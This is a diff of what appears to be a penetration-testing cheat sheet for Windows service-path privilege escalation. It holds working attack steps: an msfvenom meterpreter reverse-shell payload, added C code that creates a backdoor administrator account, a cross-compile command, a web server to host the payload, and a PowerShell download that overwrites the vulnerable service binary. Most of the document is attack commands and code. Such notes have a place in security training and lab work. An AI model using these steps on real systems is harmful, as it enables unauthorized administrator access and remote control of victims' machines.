@@ -29,9 +29,28 @@ icacls "C:\Path"
 # Craft and place malicious exe in service path
 Generate payload with msfvenom:
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o reverse.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$(IP_ADDRESS) LPORT=$(PORT) -f exe -o service.exe
 ```
-Configure webserver to host file for transfer and listener for meterpreter shell:
+Or
+Example malicious service to use:
+```c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+```
+On kali, cross-compile the service:
+```batch
+x86_64-w64-mingw32-gcc adduser.c -o service.exe
+```
+# Configure webserver to host file for transfer and listener for meterpreter shell
 ```bash
 python -m http.server 80
 ```
@@ -43,7 +62,7 @@ use exploit/multi/handler
 ```
 Transfer file to target machine at the vulnerable service path:
 ```powershell
-iwr -uri http://$(IP_ADDRESS)/reverse.exe -Outfile "C:\Vulnerable\Service\Path.exe"
+iwr -uri http://$(IP_ADDRESS)/service.exe -Outfile "C:\Vulnerable\Service\Path.exe"
 ```
 # Restart service
 Either restart revice manually or reboot the target (assuming the service is set to automatic startup)
